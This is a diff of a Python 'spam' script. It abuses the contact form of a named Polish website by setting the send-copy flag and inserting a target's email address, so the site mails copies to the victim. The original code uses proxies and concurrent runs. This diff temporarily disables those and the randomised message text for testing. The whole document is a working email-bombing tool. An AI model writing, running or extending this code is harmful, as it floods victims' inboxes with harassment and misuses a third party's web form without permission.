@@ -17,7 +17,6 @@ headers = {
     'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': '_gid=GA1.2.565055131.1677758053; _gat_gtag_UA_252882521_1=1; _ga=GA1.1.1866714413.1677758053; _ga_268EVPMKCC=GS1.1.1677758052.1.1.1677758137.0.0.0',
     'origin': 'https://www.pigeonproductions.pl',
     'pragma': 'no-cache',
     'referer': 'https://www.pigeonproductions.pl/contact/',
@@ -39,18 +38,19 @@ class ConcreteSpam(Spam):
     def post(self, target) -> requests.Response | None:
         data = 'sendmessage=1&emailaddress=wezxasqw@gmail.com&message=test&fullname=test&sendcopy=true'
         data = data.replace('wezxasqw@gmail.com', target)
-        data = data.replace('test', self.get_text())
+        # data = data.replace('test', self.get_text())
 
         response = requests.post('https://www.pigeonproductions.pl/', cookies=cookies, headers=headers,
-                                 data=data.encode(), proxies=self.get_proxies())
+                                 data=data.encode())
+        print(response.text)
         return response
 
 
 def main():
     spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
     res = spam.send_post()
-    if res:
-        spam.run_concurrently()
+    # if res:
+    #     spam.run_concurrently(60)
 
 
 if __name__ == '__main__':
